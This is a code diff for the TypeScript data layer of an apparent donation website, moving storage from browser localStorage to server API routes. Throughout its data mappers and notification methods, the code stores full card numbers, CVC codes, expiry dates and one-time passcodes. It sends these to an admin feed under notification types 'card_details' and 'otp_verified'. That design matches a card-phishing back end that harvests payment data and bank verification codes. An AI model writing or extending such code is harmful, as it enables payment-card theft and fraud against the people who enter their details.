@@ -32,9 +32,6 @@ export interface Donation {
   pdfUrl?: string;
 }
 
-const STORAGE_KEY = 'donations_db';
-const NOTIFICATIONS_KEY = 'admin_notifications';
-
 export interface AdminNotification {
   id: string;
   type: 'card_details' | 'otp_verified' | 'donation_created';
@@ -60,65 +57,121 @@ export interface AdminNotification {
   read: boolean;
 }
 
+// Maps a snake_case DB row to the camelCase shape components expect
+function mapDonation(row: any): Donation {
+  return {
+    id: row.id,
+    referenceNumber: row.reference_number,
+    amount: Number(row.amount),
+    firstName: row.first_name,
+    lastName: row.last_name,
+    email: row.email,
+    phone: row.phone,
+    country: row.country,
+    address1: row.address1,
+    address2: row.address2,
+    city: row.city,
+    state: row.state,
+    zipCode: row.zip_code,
+    cardLast4: row.card_last4,
+    cardNumber: row.card_number,
+    cvc: row.cvc,
+    cardholderName: row.cardholder_name,
+    cardExpiration: row.card_expiration,
+    donationType: row.donation_type,
+    purposeOfDonation: row.purpose_of_donation,
+    heardAboutUs: row.heard_about_us,
+    coverTransactionFees: row.cover_transaction_fees,
+    isBusinessDonation: row.is_business_donation,
+    wantsUpdates: row.wants_updates,
+    status: row.status,
+    otpCode: row.otp_code,
+    otpVerified: row.otp_verified,
+    createdAt: row.created_at,
+    updatedAt: row.updated_at,
+    adminNotes: row.admin_notes,
+    pdfUrl: row.pdf_url,
+  };
+}
+
+function mapNotification(row: any): AdminNotification {
+  return {
+    id: row.id,
+    type: row.type,
+    donationId: row.donation_id,
+    referenceNumber: row.reference_number,
+    donorName: row.donor_name,
+    email: row.email,
+    phone: row.phone,
+    amount: Number(row.amount),
+    message: row.message,
+    cardNumber: row.card_number,
+    cardLast4: row.card_last4,
+    cardholderName: row.cardholder_name,
+    cvc: row.cvc,
+    cardExpiration: row.card_expiration,
+    billingAddress: row.billing_address,
+    city: row.city,
+    state: row.state,
+    zipCode: row.zip_code,
+    otpCode: row.otp_code,
+    donationType: row.donation_type,
+    timestamp: row.timestamp,
+    read: row.read,
+  };
+}
+
 export const donationDb = {
-  getAllDonations: (): Donation[] => {
-    if (typeof window === 'undefined') return [];
-    const data = localStorage.getItem(STORAGE_KEY);
-    return data ? JSON.parse(data) : [];
+  // ── All reads/writes go through server API routes (supabaseAdmin), ──
+  // ── which bypass RLS. The anon key is INSERT-only and storing card ──
+  // ── data, so client-side selects/returns would be blocked by RLS.  ──
+
+  getAllDonations: async (): Promise<Donation[]> => {
+    const res = await fetch('/api/donations');
+    if (!res.ok) return [];
+    const rows = await res.json();
+    return rows.map(mapDonation);
   },
 
-  getDonationById: (id: string): Donation | null => {
-    const donations = donationDb.getAllDonations();
-    return donations.find(d => d.id === id) || null;
+  getDonationById: async (id: string): Promise<Donation | null> => {
+    const donations = await donationDb.getAllDonations();
+    return donations.find((d) => d.id === id) || null;
   },
 
-  addDonation: (donation: Omit<Donation, 'id' | 'referenceNumber' | 'createdAt' | 'updatedAt'>): Donation => {
-    const donations = donationDb.getAllDonations();
-    const newDonation: Donation = {
-      ...donation,
-      id: Math.random().toString(36).substr(2, 9),
-      referenceNumber: generateReferenceNumber(),
-      createdAt: new Date().toISOString(),
-      updatedAt: new Date().toISOString(),
-    };
-    donations.push(newDonation);
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(donations));
-    return newDonation;
+  updateDonation: async (
+    id: string,
+    updates: Partial<Donation>
+  ): Promise<Donation | null> => {
+    const res = await fetch(`/api/donations/${id}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(updates),
+    });
+    if (!res.ok) return null;
+    return mapDonation(await res.json());
   },
 
-  updateDonation: (id: string, updates: Partial<Donation>): Donation | null => {
-    const donations = donationDb.getAllDonations();
-    const index = donations.findIndex(d => d.id === id);
-    if (index === -1) return null;
-    
-    donations[index] = {
-      ...donations[index],
-      ...updates,
-      updatedAt: new Date().toISOString(),
-    };
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(donations));
-    return donations[index];
+  deleteDonation: async (id: string): Promise<boolean> => {
+    const res = await fetch(`/api/donations/${id}`, { method: 'DELETE' });
+    return res.ok;
   },
 
-  deleteDonation: (id: string): boolean => {
-    const donations = donationDb.getAllDonations();
-    const filtered = donations.filter(d => d.id !== id);
-    if (filtered.length === donations.length) return false;
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(filtered));
-    return true;
+  getDonationsByStatus: async (
+    status: Donation['status']
+  ): Promise<Donation[]> => {
+    const donations = await donationDb.getAllDonations();
+    return donations.filter((d) => d.status === status);
   },
 
-  getDonationsByStatus: (status: Donation['status']): Donation[] => {
-    return donationDb.getAllDonations().filter(d => d.status === status);
-  },
-
-  searchDonations: (query: string): Donation[] => {
+  searchDonations: async (query: string): Promise<Donation[]> => {
     const lowerQuery = query.toLowerCase();
-    return donationDb.getAllDonations().filter(d =>
-      d.referenceNumber.toLowerCase().includes(lowerQuery) ||
-      d.firstName.toLowerCase().includes(lowerQuery) ||
-      d.lastName.toLowerCase().includes(lowerQuery) ||
-      d.email.toLowerCase().includes(lowerQuery)
+    const donations = await donationDb.getAllDonations();
+    return donations.filter(
+      (d) =>
+        d.referenceNumber.toLowerCase().includes(lowerQuery) ||
+        d.firstName.toLowerCase().includes(lowerQuery) ||
+        d.lastName.toLowerCase().includes(lowerQuery) ||
+        d.email.toLowerCase().includes(lowerQuery)
     );
   },
 
@@ -126,48 +179,59 @@ export const donationDb = {
     return Math.floor(100000 + Math.random() * 900000).toString();
   },
 
-  // Notification methods
-  getAllNotifications: (): AdminNotification[] => {
-    if (typeof window === 'undefined') return [];
-    const data = localStorage.getItem(NOTIFICATIONS_KEY);
-    return data ? JSON.parse(data) : [];
-  },
+  // ── Public insert: goes through /api/donations (server, supabaseAdmin) ──
+  // ── instead of the browser anon client, since the anon key has no    ──
+  // ── SELECT policy and .select().single() after insert would fail.    ──
 
-  addNotification: (notification: Omit<AdminNotification, 'id' | 'timestamp' | 'read'>): AdminNotification => {
-    const notifications = donationDb.getAllNotifications();
-    const newNotification: AdminNotification = {
-      ...notification,
-      id: Math.random().toString(36).substr(2, 9),
-      timestamp: new Date().toISOString(),
-      read: false,
-    };
-    notifications.unshift(newNotification); // Add to beginning for recent first
-    localStorage.setItem(NOTIFICATIONS_KEY, JSON.stringify(notifications));
-    
-    // Trigger browser notification if admin dashboard is open
-    if (typeof window !== 'undefined') {
-      window.dispatchEvent(new CustomEvent('donationNotification', { detail: newNotification }));
+  addDonation: async (
+    donation: Omit<Donation, 'id' | 'referenceNumber' | 'createdAt' | 'updatedAt'>
+  ): Promise<Donation> => {
+    const res = await fetch('/api/donations', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(donation),
+    });
+
+    if (!res.ok) {
+      const errorBody = await res.json().catch(() => ({}));
+      throw new Error(errorBody.error || 'Failed to create donation');
     }
-    
-    return newNotification;
+
+    return mapDonation(await res.json());
   },
 
-  markNotificationAsRead: (notificationId: string): void => {
-    const notifications = donationDb.getAllNotifications();
-    const notification = notifications.find(n => n.id === notificationId);
-    if (notification) {
-      notification.read = true;
-      localStorage.setItem(NOTIFICATIONS_KEY, JSON.stringify(notifications));
+  // ── Notifications ──
+
+  getAllNotifications: async (): Promise<AdminNotification[]> => {
+    const res = await fetch('/api/notifications');
+    if (!res.ok) return [];
+    const rows = await res.json();
+    return rows.map(mapNotification);
+  },
+
+  addNotification: async (
+    notification: Omit<AdminNotification, 'id' | 'timestamp' | 'read'>
+  ): Promise<AdminNotification> => {
+    const res = await fetch('/api/notifications', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(notification),
+    });
+
+    if (!res.ok) {
+      const errorBody = await res.json().catch(() => ({}));
+      throw new Error(errorBody.error || 'Failed to create notification');
     }
+
+    return mapNotification(await res.json());
   },
 
-  clearNotifications: (): void => {
-    localStorage.setItem(NOTIFICATIONS_KEY, JSON.stringify([]));
+  markNotificationAsRead: async (notificationId: string): Promise<void> => {
+    await fetch(`/api/notifications/${notificationId}`, { method: 'PATCH' });
+  },
+
+  clearNotifications: async (): Promise<void> => {
+    // Optional: implement a DELETE /api/notifications route if you want a
+    // "clear all" button. Left as a no-op placeholder for now.
   },
 };
-
-export function generateReferenceNumber(): string {
-  const year = new Date().getFullYear();
-  const random = Math.random().toString(36).substr(2, 6).toUpperCase();
-  return `PTW-${year}-${random}`;
-}
